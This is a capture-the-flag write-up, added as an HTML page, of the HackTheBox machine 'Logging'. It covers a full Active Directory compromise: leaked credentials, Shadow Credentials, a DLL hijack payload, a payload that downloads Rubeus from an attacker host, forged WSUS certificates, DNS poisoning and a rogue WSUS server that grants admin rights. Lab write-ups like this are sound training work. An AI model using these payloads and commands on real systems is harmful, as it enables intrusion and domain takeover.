@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Logging</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+  .machine-cover{
+    width:100%;
+    max-height:280px;
+    object-fit:cover;
+    border-radius:6px;
+    border:1px solid var(--panel-line);
+    box-shadow:0 14px 34px rgba(0,0,0,0.45);
+    margin-bottom:24px;
+    display:block;
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <img class="machine-cover" src="../assets/img/machines/logging.png" alt="Logging — HackTheBox machine cover">
+  <span class="file-tab">Medium · Windows AD</span>
+  <h1>Logging</h1>
+  <div class="subtitle">HackTheBox</div>
+  <div class="tags">
+    <span class="tag">SMB Log Leak</span>
+    <span class="tag">Shadow Credentials</span>
+    <span class="tag">DLL Hijack</span>
+    <span class="tag">ADCS ESC17</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">SMB Credential Leak</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Shadow Credentials</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Scheduled Task DLL Hijack</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Rogue WSUS (ESC17)</span>
+  </div>
+
+  <p style="color:var(--muted);font-size:0.85rem;font-family:'IBM Plex Mono',monospace;">
+    <strong style="color:var(--text);">Domain:</strong> logging.htb (Windows Server 2019 DC) &nbsp;·&nbsp;
+    <strong style="color:var(--text);">Starting Credentials:</strong> <code>wallace.everette / Welcome2026@</code>
+  </p>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>User Flag Path (via DLL Hijack)</h2></div>
+
+    <p><strong>1. Recon</strong></p>
+    <p>Full TCP sweep first:</p>
+    <pre><code>nmap --min-rate 5000 -T4 -p- &lt;TARGET_IP&gt;</code></pre>
+    <p>Then a targeted scan on what came back:</p>
+    <pre><code>nmap -sCV -O --min-rate 5000 -T4 -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,47001,49664-49776 &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        (generic dns response: SERVFAIL)
+80/tcp    open  http          Microsoft IIS httpd 10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb)
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
+8530/tcp  open  http          Microsoft IIS httpd 10.0
+8531/tcp  open  ssl/unknown   (WSUS - cert CN=DC01.logging.htb)
+9389/tcp  open  mc-nmf        .NET Message Framing (ADWS)
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
+49664-49776/tcp open msrpc/ncacn_http  (RPC ephemeral range)
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+Service Info: Host: DC01; OS: Windows</code></pre>
+    <p><strong>Key ports:</strong> 88 (Kerberos), 389/3268 (LDAP/GC), 445 (SMB), 5985 (WinRM), 9389 (ADWS), <mark>8530/8531 (WSUS — this comes back around later)</mark>. <code>smb2-security-mode</code> shows signing enabled and required, which rules out NTLM relay and MS17-010 immediately.</p>
+
+    <p>The LDAP banners reveal the domain and hostname, so add the DC to <code>/etc/hosts</code> and sync clock (Kerberos is strict about skew):</p>
+    <pre><code>echo "&lt;TARGET_IP&gt; DC01.logging.htb logging.htb" | sudo tee -a /etc/hosts
+sudo ntpdate &lt;TARGET_IP&gt;</code></pre>
+
+    <p><strong>Why not just relay or PtH?</strong> A quick check confirms it:</p>
+    <pre><code>nxc smb &lt;TARGET_IP&gt; -u wallace.everette -p &lt;initial_password&gt;</code></pre>
+    <pre><code>SMB   &lt;TARGET_IP&gt;  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB   &lt;TARGET_IP&gt;  445  DC01  [+] logging.htb\wallace.everette:&lt;initial_password&gt;</code></pre>
+    <p>Signing enforced, SMBv1 off — NTLM relay and MS17-010 are both dead on arrival. That rules out the "easy" lateral movement paths and confirms the intended route is through whatever <code>wallace.everette</code> can read.</p>
+
+    <p><strong>2. SMB Enumeration</strong></p>
+    <pre><code>smbmap -d logging.htb -H &lt;TARGET_IP&gt; -u wallace.everette -p Welcome2026@</code></pre>
+    <pre><code>[+] IP: &lt;TARGET_IP&gt;:445    Name: logging.htb
+    Disk                    Permissions     Comment
+    ----                    -----------     -------
+    ADMIN$                  NO ACCESS       Remote Admin
+    C$                      NO ACCESS       Default share
+    IPC$                    READ ONLY       Remote IPC
+    Logs                    READ ONLY
+    NETLOGON                READ ONLY       Logon server share
+    SYSVOL                  READ ONLY       Logon server share
+    WSUSTemp                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.</code></pre>
+    <pre><code>smbclient //&lt;TARGET_IP&gt;/Logs -U 'logging.htb\wallace.everette%Welcome2026@' -c "prompt OFF; recurse ON; mget *"</code></pre>
+    <pre><code>getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log
+getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log
+getting file \Service_State.log of size 468 as Service_State.log
+getting file \TaskMonitor.log of size 1170 as TaskMonitor.log</code></pre>
+    <p><strong>Found credential in IdentitySync_Trace_20260219.log:</strong> <mark class="rust">a cleartext credential leak in an application sync log</mark></p>
+    <pre><code>[2026-02-19 03:00:03.125] VERBOSE - ConnectionContext Dump: {
+  Domain: "logging.htb", Server: "DC01", SSL: "False",
+  BindUser: "LOGGING\svc_recovery", BindPass: "&lt;password (prior year)&gt;", Timeout: 30 }
+[2026-02-19 03:00:03.488] ERROR - LdapException: LDAP_INVALID_CREDENTIALS
+  Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
+  Win32 Error: 49 (Invalid Credentials)</code></pre>
+    <div class="why"><strong>Why this mattered</strong>Application and sync logs are a routine place for credentials to leak in cleartext — pulling and grepping every readable share is standard practice, not an afterthought.</div>
+
+    <p><strong>3. BloodHound &amp; the Protected Users Problem</strong></p>
+    <pre><code>bloodhound-python -u 'wallace.everette' -p 'Welcome2026@' -d 'logging.htb' -c All --zip --dns-tcp -ns &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>INFO: Found AD domain: logging.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: DC01.logging.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Compressing output into 20260419_bloodhound.zip</code></pre>
+    <p><code>svc_recovery</code> sits in <strong>Protected Users</strong> — no NTLM auth, no cached credentials, no RC4/DES, no Pass-the-Hash. The leaked password is useless anywhere except through Kerberos directly. BloodHound also shows the actual escalation path: <code>svc_recovery</code> has <strong>GenericWrite</strong> over the gMSA <code>msa_health$</code> — the setup for a Shadow Credentials attack.</p>
+
+    <p><strong>4. Year-Rollover + Kerberos Ticket</strong></p>
+    <p>The leaked credential was for the previous year's rotation. <mark>The service enforces a predictable yearly password rollover, so the current year's password could be derived from the same pattern:</mark></p>
+    <pre><code># /etc/krb5.conf realm pointed at the DC first, then:
+impacket-getTGT logging.htb/svc_recovery:'&lt;password (current year)&gt;' -dc-ip &lt;TARGET_IP&gt;
+export KRB5CCNAME=svc_recovery.ccache
+klist</code></pre>
+    <pre><code>Impacket v0.14.0.dev0 - Copyright Fortra, LLC
+[*] Saving ticket in svc_recovery.ccache
+
+Ticket cache: FILE:svc_recovery.ccache
+Default principal: svc_recovery@LOGGING.HTB
+Valid starting     Expires            Service principal
+04/19/2026 08:25:40  04/19/2026 18:25:40  krbtgt/LOGGING.HTB@LOGGING.HTB</code></pre>
+    <div class="why"><strong>Why this mattered</strong>A predictable password-rotation scheme is functionally the same as never rotating the password at all — a leaked credential from any prior cycle just becomes a one-step guess for the current one.</div>
+
+    <p><strong>5. Shadow Credentials Attack</strong></p>
+    <pre><code>certipy-ad shadow auto -k -no-pass -u svc_recovery -dc-ip &lt;TARGET_IP&gt; -target DC01.logging.htb -account 'msa_health$'</code></pre>
+    <pre><code>Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'msa_health$'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Adding Key Credential with device ID '36e4e6283aa44f06be02d00853a61fc2' to the Key Credentials for 'msa_health$'
+[*] Successfully added Key Credential
+[*] Authenticating as 'msa_health$' with the certificate
+[*] Trying to get TGT ... Got TGT
+[*] Restoring the old Key Credentials for 'msa_health$'
+[*] Trying to retrieve NT hash for 'msa_health$'
+[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5</code></pre>
+    <p><strong>Obtained NT hash:</strong> <mark class="rust"><code>603fc24ee01a9409f83c9d1d701485c5</code></mark></p>
+
+    <p><strong>6. WinRM as msa_health$</strong></p>
+    <pre><code>evil-winrm -i &lt;TARGET_IP&gt; -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5</code></pre>
+    <pre><code>Evil-WinRM shell v3.9
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\msa_health$\Documents> dir
+
+    Directory: C:\Users\msa_health$\Documents
+
+Mode           LastWriteTime         Length Name
+----           -------------         ------ ----
+-a----   4/17/2026   9:02 AM           1059 monitor.ps1</code></pre>
+    <div class="why"><strong>Why this mattered</strong>Shadow Credentials is one of the most reliable modern AD privilege-escalation primitives — any write access to an account's key-credential attribute is equivalent to a full password reset, without needing reset rights.</div>
+
+    <p><strong>7. DLL Hijack &rarr; jaylee.clifton Context (User Flag)</strong></p>
+    <p>A <code>monitor.ps1</code> script in <code>msa_health$</code>'s Documents folder watches a scheduled task, <code>UpdateChecker Agent</code>, which runs every 3 minutes as <strong>jaylee.clifton</strong> and loads a DLL from <code>C:\ProgramData\UpdateMonitor\</code> if one shows up in a dropped zip. Its log confirms the behavior:</p>
+    <pre><code>type C:\ProgramData\UpdateMonitor\Logs\monitor.log</code></pre>
+    <pre><code>[2026-04-20 11:11:16] Starting Sentinel Update Check...
+[2026-04-20 11:11:16] Checking for update on local server...
+[2026-04-20 11:11:16] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
+[2026-04-20 11:11:16] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
+[2026-04-20 11:11:16] Failed to load settings_update.dll. Error code: 126
+[2026-04-20 11:11:16] Update check completed.</code></pre>
+    <p><code>icacls</code> confirms that folder is writable by any authenticated user — a straightforward DLL search-order hijack:</p>
+    <pre><code>icacls "C:\ProgramData\UpdateMonitor"</code></pre>
+    <pre><code>C:\ProgramData\UpdateMonitor NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                              BUILTIN\Administrators:(I)(OI)(CI)(F)
+                              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                              BUILTIN\Users:(I)(OI)(CI)(RX)
+                              BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)</code></pre>
+    <p><strong>Prepare payload on Kali:</strong></p>
+    <pre><code>cat > /tmp/settings_update.c &lt;&lt; 'EOF'
+#include &lt;windows.h&gt;
+__declspec(dllexport) void PreUpdateCheck() {
+    system("whoami > C:\\ProgramData\\UpdateMonitor\\jaylee_whoami.txt 2>&amp;1");
+    system("copy C:\\Users\\jaylee.clifton\\Desktop\\user.txt C:\\ProgramData\\UpdateMonitor\\user.txt >nul 2>&amp;1");
+}
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) { return TRUE; }
+EOF
+
+i686-w64-mingw32-gcc -shared -o /tmp/settings_update.dll /tmp/settings_update.c
+zip -j /tmp/Settings_Update.zip /tmp/settings_update.dll</code></pre>
+
+    <p><strong>Deploy via WinRM:</strong></p>
+    <pre><code>Remove-Item "C:\ProgramData\UpdateMonitor\Settings_Update.zip" -Force -ErrorAction SilentlyContinue
+upload /tmp/Settings_Update.zip
+Move-Item "C:\Users\msa_health$\Documents\Settings_Update.zip" "C:\ProgramData\UpdateMonitor\Settings_Update.zip" -Force
+icacls "C:\ProgramData\UpdateMonitor\Settings_Update.zip" /grant "Everyone:(F)"</code></pre>
+    <p><strong>Wait ~3 minutes</strong> for the scheduled task <code>UpdateChecker Agent</code>.</p>
+
+    <p><strong>Check results:</strong></p>
+    <pre><code>type C:\ProgramData\UpdateMonitor\jaylee_whoami.txt
+type C:\ProgramData\UpdateMonitor\user.txt</code></pre>
+    <pre><code>logging\jaylee.clifton
+&lt;user_flag&gt;</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>Scheduled tasks that load a DLL from a writable location are a classic local privesc primitive on Windows — worth checking any time a foothold account has write access to a path referenced by an automated task running as someone else.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Root Flag Path (ESC17 + WSUS Spoof)</h2></div>
+
+    <p><strong>8. Get jaylee.clifton's TGT (Rubeus)</strong></p>
+    <p>Reused the same hijack, this time with a payload that downloads Rubeus and runs <code>tgtdeleg</code> to pull a delegable TGT for the calling user — no password needed:</p>
+    <pre><code>__declspec(dllexport) void PreUpdateCheck() {
+    system("powershell -c \"(New-Object Net.WebClient).DownloadFile("
+           "'http://&lt;KALI_IP&gt;/Rubeus.exe','C:\\ProgramData\\UpdateMonitor\\Rubeus.exe')\"");
+    system("C:\\ProgramData\\UpdateMonitor\\Rubeus.exe tgtdeleg /nowrap "
+           "&gt; C:\\ProgramData\\UpdateMonitor\\jaylee_tgt.b64 2&gt;&amp;1");
+}</code></pre>
+    <p>Extracted the base64 kirbi from the drop folder and converted it:</p>
+    <pre><code>echo "&lt;base64 blob&gt;" | base64 -d > jaylee.kirbi
+impacket-ticketConverter jaylee.kirbi jaylee.ccache
+export KRB5CCNAME=$(pwd)/jaylee.ccache
+klist</code></pre>
+    <pre><code>Ticket cache: FILE:jaylee.ccache
+Default principal: jaylee.clifton@LOGGING.HTB
+Valid starting     Expires            Service principal
+04/21/2026 05:10:02  04/21/2026 15:10:02  krbtgt/LOGGING.HTB@LOGGING.HTB</code></pre>
+
+    <p><strong>9. ADCS Enumeration — the UpdateSrv Template</strong></p>
+    <pre><code>certipy-ad find -k -no-pass -u msa_health$ -dc-ip &lt;TARGET_IP&gt; -target DC01.logging.htb -stdout -enabled</code></pre>
+    <pre><code>Display Name              : UpdateSrv
+Certificate Authorities   : logging-DC01-CA
+Enabled                   : True
+Client Authentication     : False
+Enrollee Supplies Subject : True
+Extended Key Usage        : Server Authentication
+Validity Period           : 10 years
+Minimum RSA Key Length    : 2048
+Permissions
+  Enrollment Permissions
+    Enrollment Rights     : LOGGING.HTB\IT</code></pre>
+    <table style="width:100%;border-collapse:collapse;font-family:'IBM Plex Mono',monospace;font-size:0.82rem;margin:14px 0;">
+      <tr style="border-bottom:1px solid var(--panel-line);"><th style="text-align:left;padding:6px;color:var(--brass);">Property</th><th style="text-align:left;padding:6px;color:var(--brass);">Value</th><th style="text-align:left;padding:6px;color:var(--brass);">Why it matters</th></tr>
+      <tr style="border-bottom:1px solid var(--panel-line);"><td style="padding:6px;">Enrollment rights</td><td style="padding:6px;">LOGGING.HTB\IT</td><td style="padding:6px;">jaylee.clifton is in IT, so she can enroll</td></tr>
+      <tr style="border-bottom:1px solid var(--panel-line);"><td style="padding:6px;">Enrollee Supplies Subject</td><td style="padding:6px;">True</td><td style="padding:6px;">Requester picks their own CN/SAN — ESC1-style condition</td></tr>
+      <tr><td style="padding:6px;">EKU</td><td style="padding:6px;">Server Authentication</td><td style="padding:6px;">Can't do PKINIT login, but can impersonate any internal HTTPS service — including WSUS</td></tr>
+    </table>
+
+    <p><strong>10. Forge the WSUS Server Certificate</strong></p>
+    <pre><code># build_wsus_csr.py — subject/SAN set to wsus.logging.htb
+certipy-ad req -k -no-pass -u jaylee.clifton -dc-ip &lt;TARGET_IP&gt; \
+  -dc-host DC01.logging.htb -target DC01.logging.htb \
+  -ca 'logging-DC01-CA' -template UpdateSrv \
+  -subject 'CN=wsus.logging.htb' -dns 'wsus.logging.htb' -out wsus.pfx
+openssl pkcs12 -in wsus.pfx -out wsus_cert.pem -nodes -passin pass:
+openssl x509 -in wsus_cert.pem -noout -subject -ext subjectAltName</code></pre>
+    <pre><code>[*] Successfully requested certificate
+[*] Got certificate with UPN 'jaylee.clifton@logging.htb'
+[*] Certificate object SID is 'S-1-5-21-...-1108'
+[*] Saved certificate and private key to 'wsus.pfx'
+
+subject=CN=wsus.logging.htb
+X509v3 Subject Alternative Name:
+    DNS:wsus.logging.htb, DNS:wsus</code></pre>
+
+    <p><strong>11. DNS Poisoning</strong></p>
+    <p><code>msa_health$</code> carries <code>SeMachineAccountPrivilege</code>, which lets it create a new machine account — and any authenticated computer account can create DNS node objects under <code>DomainDnsZones</code>. First create the machine account:</p>
+    <pre><code>impacket-addcomputer -computer-name 'zhaha01$' -computer-pass '&lt;computer_account_password&gt;' \
+  -hashes ':603fc24ee01a9409f83c9d1d701485c5' -dc-ip &lt;TARGET_IP&gt; 'logging.htb/msa_health$'</code></pre>
+    <pre><code>Impacket v0.14.0.dev0 - Copyright Fortra, LLC
+[*] Successfully added machine account zhaha01$ with password &lt;computer_account_password&gt;.</code></pre>
+    <p>Then point <code>wsus.logging.htb</code> at the attacker box:</p>
+    <pre><code>cd /tmp/krbrelayx
+python3 dnstool.py -u 'logging.htb\jaylee.clifton' -k \
+  -dc-ip &lt;TARGET_IP&gt; -dns-ip &lt;TARGET_IP&gt; \
+  -r 'wsus.logging.htb' -d &lt;KALI_IP&gt; -a add DC01.logging.htb</code></pre>
+    <pre><code>[*] Adding new record
+[*] Record added successfully</code></pre>
+    <p>Verify:</p>
+    <pre><code>ipconfig /flushdns
+Resolve-DnsName wsus.logging.htb</code></pre>
+    <pre><code>Name                                           Type   TTL   Section    IPAddress
+----                                           ----   ---   -------    ---------
+wsus.logging.htb                               A      180   Answer     &lt;KALI_IP&gt;</code></pre>
+
+    <p><strong>12. Rogue WSUS Server (wsuks)</strong></p>
+    <p>Serve both the content port (8530) and the HTTPS WSUS port (8531), using the forged cert:</p>
+    <pre><code># run_wsuks.py — serve-only mode
+import ssl, sys, os, logging, threading
+from functools import partial
+from http.server import HTTPServer
+
+sys.modules['wsuks.lib.router'] = type(sys)('stub')
+sys.modules['wsuks.lib.router'].Router = object
+
+from wsuks.lib.logger import initLogger
+initLogger(debug=False)
+from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer
+
+HOST = '&lt;KALI_IP&gt;'
+EXE  = './PsExec64.exe'
+COMMAND = ('/accepteula /s cmd.exe /c "'
+           'net localgroup administrators msa_health$ /add 2&gt;&amp;1 > C:\\Share\\Logs\\PWN.txt & '
+           'net localgroup administrators >> C:\\Share\\Logs\\PWN.txt 2&gt;&amp;1 & '
+           'icacls C:\\Share\\Logs\\PWN.txt /grant Everyone:F"')
+
+exe_bytes = open(EXE, 'rb').read()
+h = WSUSUpdateHandler(exe_bytes, os.path.basename(EXE), f'http://{HOST}:8530')
+h.set_resources_xml(COMMAND)
+log = logging.getLogger('wsuks')
+
+def serve(port, use_tls):
+    httpd = HTTPServer((HOST, port), partial(WSUSBaseServer, h))
+    if use_tls:
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.load_cert_chain('./wsus_cert.pem', './wsus_key.pem')
+        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
+    httpd.serve_forever()
+
+threading.Thread(target=serve, args=(8530, False), daemon=True).start()
+serve(8531, True)</code></pre>
+    <pre><code>python3 run_wsuks.py</code></pre>
+    <pre><code>[wsuks] HTTP content on &lt;KALI_IP&gt;:8530
+[wsuks] HTTPS WSUS on &lt;KALI_IP&gt;:8531</code></pre>
+    <p>The DC's built-in WSUS auto-update client trusts anything at <code>wsus.logging.htb:8531</code> presenting a valid-looking cert for that name — DNS, cert, and content server are all under attacker control at this point.</p>
+
+    <p><strong>13. Trigger Update &amp; Get Root</strong></p>
+    <pre><code>wuauclt /resetauthorization /detectnow</code></pre>
+    <p><strong>Wait 60-120 seconds:</strong></p>
+    <pre><code>type C:\Share\Logs\PWN.txt
+type C:\Windows\Temp\root.txt</code></pre>
+    <pre><code>Alias
+-----
+Administrator
+Domain Admins
+msa_health$
+
+&lt;root_flag&gt;</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>WSUS is an unusually high-trust internal service by design: it exists specifically to push and execute code on client machines, so redirecting a host to a rogue WSUS instance is one of the more direct "automatic code execution as SYSTEM" paths available once DNS and certificate trust can both be manipulated.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>Final Verification</h2></div>
+    <pre><code>net localgroup administrators</code></pre>
+    <pre><code>Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+-------------------------------------------------------------------------
+Administrator
+Domain Admins
+msa_health$
+The command completed successfully.</code></pre>
+    <p><mark class="green"><code>msa_health$</code> is now in the Administrators group.</mark></p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>Attack Chain Summary</h2></div>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li><strong>wallace.everette</strong> &rarr; Leaked <code>svc_recovery</code> credential (year rollover)</li>
+      <li><strong>svc_recovery</strong> &rarr; Shadow Credentials &rarr; <code>msa_health$</code></li>
+      <li><strong>msa_health$</strong> &rarr; DLL Hijack on scheduled task &rarr; <code>jaylee.clifton</code> context &rarr; <strong>User Flag</strong></li>
+      <li><strong>jaylee.clifton</strong> &rarr; DNS Poison + ADCS ESC17 (UpdateSrv cert)</li>
+      <li><strong>Rogue WSUS</strong> &rarr; SYSTEM execution &rarr; <strong>Root Flag</strong></li>
+    </ol>
+    <p><strong>Techniques Used:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Credential leak + predictable password rotation</li>
+      <li>Shadow Credentials on a Managed Service Account</li>
+      <li>DLL Hijacking via a scheduled task</li>
+      <li>ADCS ESC17 + WSUS MITM</li>
+      <li>Kerberos delegation (tgtdeleg)</li>
+    </ul>
+    <p><strong>Tools:</strong> smbclient, impacket, certipy-ad, Rubeus, wsuks, evil-winrm</p>
+  </div>
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
